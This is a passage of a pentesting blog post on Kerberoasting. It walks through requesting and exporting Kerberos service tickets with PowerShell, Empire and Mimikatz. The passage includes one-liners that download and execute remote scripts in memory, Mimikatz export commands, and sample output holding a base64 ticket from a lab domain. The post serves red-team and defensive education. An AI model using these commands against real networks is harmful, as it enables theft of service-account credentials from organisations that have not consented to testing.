<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Kerberoasting - Part 2 - Malicious Link - Blog by mubix - Rob Fuller</title><meta name="Description" content="This is a cool blog"><meta property="og:title" content="Kerberoasting - Part 2" />
<meta property="og:description" content="Previous works: There has been a number of different blog posts, presentations and projects that have happened before this post and I will reference a number of them during the post and at the end have a link to all that I know about. If you know of any works on this subject that I am missing please submit a comment below and I&rsquo;ll will be sure to reference it." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://malicious.link/posts/2016/kerberoast-pt2/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2016-05-21T07:35:28-05:00" />
<meta property="article:modified_time" content="2016-05-21T07:35:28-05:00" /><meta property="og:site_name" content="My cool site" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Kerberoasting - Part 2"/>
<meta name="twitter:description" content="Previous works: There has been a number of different blog posts, presentations and projects that have happened before this post and I will reference a number of them during the post and at the end have a link to all that I know about. If you know of any works on this subject that I am missing please submit a comment below and I&rsquo;ll will be sure to reference it."/>
<meta name="application-name" content="malicious.link">
<meta name="apple-mobile-web-app-title" content="malicious.link"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://malicious.link/posts/2016/kerberoast-pt2/" /><link rel="prev" href="https://malicious.link/posts/2016/kerberoast-pt1/" /><link rel="next" href="https://malicious.link/posts/2016/kerberoast-pt3/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Kerberoasting - Part 2",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/malicious.link\/posts\/2016\/kerberoast-pt2\/"
        },"genre": "posts","keywords": "kerberos, impacket, empire, powershell, spn, mimikatz","wordcount":  1584 ,
        "url": "https:\/\/malicious.link\/posts\/2016\/kerberoast-pt2\/","datePublished": "2016-05-21T07:35:28-05:00","dateModified": "2016-05-21T07:35:28-05:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "Rob Fuller"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/about"> About </a><a class="menu-item" href="/brandon"> Brandon </a><a class="menu-item" href="/categories"> Categories </a><a class="menu-item" href="/posts"> Posts </a><a class="menu-item" href="/start"> Start </a><a class="menu-item" href="/tags"> Tags </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-desktop">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Malicious Link - Blog by mubix - Rob Fuller"># malicious.link</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><div class="search-wrapper">
                    <div class="search mobile" id="search-mobile">
                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
                        </a>
                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
                        </a>
                        <span class="search-button search-loading" id="search-loading-mobile">
                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
                        </span>
                    </div>
                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
                        Cancel
                    </a>
                </div><a class="menu-item" href="/about" title="">About</a><a class="menu-item" href="/brandon" title="">Brandon</a><a class="menu-item" href="/categories" title="">Categories</a><a class="menu-item" href="/posts" title="">Posts</a><a class="menu-item" href="/start" title="">Start</a><a class="menu-item" href="/tags" title="">Tags</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><div class="search-dropdown desktop">
        <div id="search-dropdown-desktop"></div>
    </div>
    <div class="search-dropdown mobile">
        <div id="search-dropdown-mobile"></div>
    </div><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Kerberoasting - Part 2</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://twitter.com/mubix" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Rob Fuller</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2016-05-21">2016-05-21</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1584 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;8 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#requesting-spn-kerberos-tickets">Requesting SPN Kerberos Tickets</a>
      <ul>
        <li><a href="#powershell-requesting">PowerShell Requesting</a></li>
        <li><a href="#powershell-requesting---just-users">PowerShell Requesting - Just Users</a></li>
        <li><a href="#empire">Empire</a></li>
      </ul>
    </li>
    <li><a href="#exporting-the-tickets">Exporting the tickets</a>
      <ul>
        <li><a href="#mimikatz">Mimikatz</a></li>
        <li><a href="#empire-1">Empire</a></li>
        <li><a href="#kirbi2john">Kirbi2John</a></li>
      </ul>
    </li>
    <li><a href="#pykerberoast">PyKerberoast</a></li>
    <li><a href="#impacket">Impacket</a></li>
  </ul>

  <ul>
    <li><a href="#tools">Tools</a></li>
    <li><a href="#presentations">Presentations</a></li>
    <li><a href="#other-write-ups">Other write ups</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p><strong>Previous works:</strong> There has been a number of different blog posts, presentations and projects that have happened before this post and I will reference a number of them during the post and at the end have a link to all that I know about. If you know of any works on this subject that I am missing please submit a comment below and I&rsquo;ll will be sure to reference it.</p>
<p><strong>Attacker KB Link:</strong> (to be updated later)</p>
<p><strong>Common Findings DB Link:</strong> (to be updated later)</p>
<p>Now that we&rsquo;ve listed all the tickets in a ton of different ways, we need to request the ones we want and get them to a point that we can start cracking them.</p>
<h2 id="requesting-spn-kerberos-tickets">Requesting SPN Kerberos Tickets</h2>
<h3 id="powershell-requesting">PowerShell Requesting</h3>
<p>These are stolen directly from <a href="https://twitter.com/timmedin" target="_blank" rel="noopener noreffer ">Tim Medin @timmedin</a>&rsquo;s <a href="https://github.com/nidem/kerberoast/blob/master/README.md" target="_blank" rel="noopener noreffer ">Kerberoast repository README.md</a></p>
<p><strong>One specific ticket:</strong></p>
<p>This is great if you are targeting one specific user account:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\&gt; Add-Type -AssemblyName System.IdentityModel  
</span></span><span class="line"><span class="cl">PS C:\&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &#34;HTTP/web01.medin.local&#34;  
</span></span></code></pre></td></tr></table>
</div>
</div><p><strong>All the tickets (including Computer account tickets):</strong></p>
<p>I&rsquo;m not a huge fan of this method since you get too many tickets to deal with but it&rsquo;s a great example of how to use PowerShell to parse and request things like this:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\&gt; Add-Type -AssemblyName System.IdentityModel  
</span></span><span class="line"><span class="cl">PS C:\&gt; setspn.exe -T medin.local -Q */* | Select-String &#39;^CN&#39; -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="powershell-requesting---just-users">PowerShell Requesting - Just Users</h3>
<p><strong>Getting just the User tickets:</strong></p>
<p>This is a slightly modified version of Tim&rsquo;s script from above. It pulls down his GetUserSPNs powershell script instead of using <code>SetSPN.exe</code> and makes a request for each of the resulting SPN tickets.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\&gt; Add-Type -AssemblyName System.IdentityModel
</span></span><span class="line"><span class="cl">PS C:\&gt; IEX (New-Object Net.WebClient).DownloadString(&#34;https://raw.githubusercontent.com/nidem/kerberoast/master/GetUserSPNs.ps1&#34;) | ForEach-Object {try{New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.ServicePrincipalName}catch{}}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="empire">Empire</h3>
<p>PowerShell Empire received the functionality to get the SPN Tickets via <a href="https://twitter.com/harmj0y" target="_blank" rel="noopener noreffer ">@harmj0y</a>&rsquo;s commit here: <a href="https://github.com/PowerShellEmpire/Empire/commit/b977dec1ae71753b6b896497be222abc6a124639" target="_blank" rel="noopener noreffer ">b977dec</a> which as of the writing of this post was still in the <code>dev</code> branch of Empire (not master yet)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(Empire: BDW3E2G2ZRKCUS3B) &gt; usemodule credentials/get_spn_tickets
</span></span><span class="line"><span class="cl">(Empire: credentials/get_spn_tickets) &gt; info
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">           Name: Get-SPNTickets
</span></span><span class="line"><span class="cl">         Module: credentials/get_spn_tickets
</span></span><span class="line"><span class="cl">     NeedsAdmin: False
</span></span><span class="line"><span class="cl">      OpsecSafe: True
</span></span><span class="line"><span class="cl">   MinPSVersion: 2
</span></span><span class="line"><span class="cl">     Background: True
</span></span><span class="line"><span class="cl">OutputExtension: None
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Authors:
</span></span><span class="line"><span class="cl">  @harmj0y
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Description:
</span></span><span class="line"><span class="cl">  Requests kerberos tickets for all users with a non-null
</span></span><span class="line"><span class="cl">  service principal name (SPN). These tickets can be extracted
</span></span><span class="line"><span class="cl">  with credentials/mimikatz/extract_tickets.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Options:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Name  Required    Value                     Description
</span></span><span class="line"><span class="cl">  ----  --------    -------                   -----------
</span></span><span class="line"><span class="cl">  Agent True        BDW3E2G2ZRKCUS3B          Agent to run module on.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">(Empire: credentials/get_spn_tickets) &gt; run
</span></span><span class="line"><span class="cl">Job started: Debug32_a7og3
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Id                   : uuid-7856e72a-2c40-4d94-a939-8c671b80e2bd-1
</span></span><span class="line"><span class="cl">SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKe
</span></span><span class="line"><span class="cl">                       y}
</span></span><span class="line"><span class="cl">ValidFrom            : 5/19/2016 3:06:41 PM
</span></span><span class="line"><span class="cl">ValidTo              : 5/19/2016 3:08:41 PM
</span></span><span class="line"><span class="cl">ServicePrincipalName : kadmin/changepw
</span></span><span class="line"><span class="cl">SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Id                   : uuid-7856e72a-2c40-4d94-a939-8c671b80e2bd-2
</span></span><span class="line"><span class="cl">SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKe
</span></span><span class="line"><span class="cl">                       y}
</span></span><span class="line"><span class="cl">ValidFrom            : 5/19/2016 3:06:41 PM
</span></span><span class="line"><span class="cl">ValidTo              : 5/20/2016 12:53:24 AM
</span></span><span class="line"><span class="cl">ServicePrincipalName : http/win10.sittingduck.info
</span></span><span class="line"><span class="cl">SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Id                   : uuid-7856e72a-2c40-4d94-a939-8c671b80e2bd-3
</span></span><span class="line"><span class="cl">SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKe
</span></span><span class="line"><span class="cl">                       y}
</span></span><span class="line"><span class="cl">ValidFrom            : 5/19/2016 3:06:41 PM
</span></span><span class="line"><span class="cl">ValidTo              : 5/20/2016 12:53:24 AM
</span></span><span class="line"><span class="cl">ServicePrincipalName : MSSQLSvc/WIN2K8R2.sittingduck.info
</span></span><span class="line"><span class="cl">SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Get-SPNTickets completed!
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="exporting-the-tickets">Exporting the tickets</h2>
<p>Now we need to get the tickets out of the system we just requested them to. We can do this with Mimikatz both by itself, or directly in Empire:</p>
<h3 id="mimikatz">Mimikatz</h3>
<p>Using the <strong><code>kerberos::list /export</code></strong> functionality is awesome, but this will generate a file per-ticket. I have been on a few engagements where that meant 4000+ files. Luckily the awesome <a href="https://twitter.com/gentilkiwi" target="_blank" rel="noopener noreffer ">@gentilkiwi</a> saves us and has included a &ldquo;base64&rdquo; mode for Mimikatz</p>
<p>So here I&rsquo;m simply pulling the <code>Invoke-Mimikatz</code> script that <a href="https://twitter.com/JosephBialek" target="_blank" rel="noopener noreffer ">@JosephBialek</a> &ldquo;clymb3r&rdquo; created, into memory, telling Mimikatz to go in &ldquo;base64&rdquo; mode, export all of the active tickets and exit.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">PS C:\&gt; IEX (New-Object Net.WebClient).DownloadString(&#34;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#34;)
</span></span><span class="line"><span class="cl">PS C:\&gt; Invoke-Mimikatz -Command &#39;standard::base64 &#34;kerberos::list /export&#34; exit&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="empire-1">Empire</h3>
<p>Here is the module:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(Empire: agents) &gt; usemodule credentials/mimikatz/extract_tickets
</span></span><span class="line"><span class="cl">(Empire: credentials/mimikatz/extract_tickets) &gt; info
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">           Name: Invoke-Mimikatz extract kerberos tickets.
</span></span><span class="line"><span class="cl">         Module: credentials/mimikatz/extract_tickets
</span></span><span class="line"><span class="cl">     NeedsAdmin: False
</span></span><span class="line"><span class="cl">      OpsecSafe: True
</span></span><span class="line"><span class="cl">   MinPSVersion: 2
</span></span><span class="line"><span class="cl">     Background: True
</span></span><span class="line"><span class="cl">OutputExtension: None
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Authors:
</span></span><span class="line"><span class="cl">  @JosephBialek
</span></span><span class="line"><span class="cl">  @gentilkiwi
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Description:
</span></span><span class="line"><span class="cl">  Runs PowerSploit&#39;s Invoke-Mimikatz function to extract
</span></span><span class="line"><span class="cl">  kerberos tickets from memory in base64-encoded form.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Options:
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  Name  Required    Value                     Description
</span></span><span class="line"><span class="cl">  ----  --------    -------                   -----------
</span></span><span class="line"><span class="cl">  Agent True        None                      Agent to run module on.
</span></span></code></pre></td></tr></table>
</div>
</div><p>And the result&hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="n">Job</span><span class="w"> </span><span class="n">started</span><span class="p">:</span><span class="w"> </span><span class="n">Debug32_segox</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Hostname</span><span class="p">:</span><span class="w"> </span><span class="n">win7</span><span class="p">.</span><span class="n">sittingduck</span><span class="p">.</span><span class="n">info</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">S</span><span class="o">-</span><span class="mi">1</span><span class="o">-</span><span class="mi">5</span><span class="o">-</span><span class="mi">21</span><span class="o">-</span><span class="mi">4217918325</span><span class="o">-</span><span class="mi">2978756054</span><span class="o">-</span><span class="mi">1117708521</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="p">.</span><span class="c1">#####.   mimikatz 2.1 (x64) built on Mar 31 2016 16:45:32
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="p">.</span><span class="c1">## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="c1">## / \ ##  /* * *
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="c1">## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w"> </span><span class="s1">&#39;## v ##&#39;</span><span class="w">   </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">blog</span><span class="p">.</span><span class="n">gentilkiwi</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="nf">mimikatz</span><span class="w">             </span><span class="p">(</span><span class="n">oe</span><span class="p">.</span><span class="n">eo</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="s1">&#39;#####&#39;</span><span class="w">                                     </span><span class="k">with</span><span class="w"> </span><span class="mi">18</span><span class="w"> </span><span class="n">modules</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">*/</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nf">mimikatz</span><span class="p">(</span><span class="n">powershell</span><span class="p">)</span><span class="w"> </span><span class="c1"># standard::base64
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">isBase64Intercept</span><span class="w"> </span><span class="n">was</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="no">false</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">isBase64Intercept</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">now</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="no">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nf">mimikatz</span><span class="p">(</span><span class="n">powershell</span><span class="p">)</span><span class="w"> </span><span class="c1"># kerberos::list /export
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">[</span><span class="mi">00000000</span><span class="p">]</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">0</span><span class="n">x00000012</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">aes256_hmac</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="n">Start</span><span class="o">/</span><span class="n">End</span><span class="o">/</span><span class="n">MaxRenew</span><span class="p">:</span><span class="w"> </span><span class="mi">5</span><span class="o">/</span><span class="mi">19</span><span class="o">/</span><span class="mi">2016</span><span class="w"> </span><span class="mi">10</span><span class="p">:</span><span class="mi">53</span><span class="p">:</span><span class="mi">27</span><span class="w"> </span><span class="n">AM</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="mi">5</span><span class="o">/</span><span class="mi">19</span><span class="o">/</span><span class="mi">2016</span><span class="w"> </span><span class="mi">8</span><span class="p">:</span><span class="mi">53</span><span class="p">:</span><span class="mi">24</span><span class="w"> </span><span class="n">PM</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="mi">5</span><span class="o">/</span><span class="mi">26</span><span class="o">/</span><span class="mi">2016</span><span class="w"> </span><span class="mi">10</span><span class="p">:</span><span class="mi">53</span><span class="p">:</span><span class="mi">24</span><span class="w"> </span><span class="n">AM</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="n">Server</span><span class="w"> </span><span class="n">Name</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="n">krbtgt</span><span class="o">/</span><span class="n">SITTINGDUCK</span><span class="p">.</span><span class="n">INFO</span><span class="w"> </span><span class="o">@</span><span class="w"> </span><span class="n">SITTINGDUCK</span><span class="p">.</span><span class="n">INFO</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="n">Client</span><span class="w"> </span><span class="n">Name</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="n">notanadmin</span><span class="w"> </span><span class="o">@</span><span class="w"> </span><span class="n">SITTINGDUCK</span><span class="p">.</span><span class="n">INFO</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">   </span><span class="n">Flags</span><span class="w"> </span><span class="mi">60</span><span class="n">a10000</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="n">name_canonicalize</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="n">pre_authent</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="n">renewable</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="n">forwarded</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="n">forwardable</span><span class="w"> </span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">====================</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Base64</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="o">-</span><span class="mi">60</span><span class="n">a10000</span><span class="o">-</span><span class="n">notanadmin</span><span class="o">@</span><span class="n">krbtgt</span><span class="o">~</span><span class="n">SITTINGDUCK</span><span class="p">.</span><span class="n">INFO</span><span class="o">-</span><span class="n">SITTINGDUCK</span><span class="p">.</span><span class="n">INFO</span><span class="p">.</span><span class="n">kirbi</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">====================</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">doIFTjCCBUqgAwIBBaEDAgEWooIEVTCCBFFhggRNMIIESaADAgEFoRIbEFNJVFRJ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">TkdEVUNLLklORk</span><span class="o">+</span><span class="n">iJTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEFNJVFRJTkdEVUNLLklO</span><span class="w">
